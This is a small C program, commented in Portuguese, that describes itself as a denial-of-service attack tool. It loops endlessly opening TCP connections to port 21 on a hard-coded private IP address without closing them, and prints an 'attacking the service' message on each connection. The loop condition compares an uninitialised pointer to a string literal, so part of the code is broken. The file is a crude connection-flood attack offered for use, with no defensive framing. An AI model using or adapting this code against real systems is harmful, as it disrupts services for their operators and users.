/*Programa para ataque de negação de serviço*/

#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>


int main(void) {
	
	int meusocket;
	int conecta;
	char * ip;
	
	struct sockaddr_in alvo;
	while(ip != " "){
	
	meusocket = socket(AF_INET,SOCK_STREAM, 0);
	alvo.sin_family = AF_INET;
	alvo.sin_port = htons(21); // Porta do serviço
	alvo.sin_addr.s_addr = inet_addr("192.168.0.1"); // IP do alvo 
	
	conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);
	if(conecta ==0){
		printf("Realizando ataque no serviço\n");
		
	}/* else {
		close(meusocket);
		close(conecta);
		
	}*/
   }

}
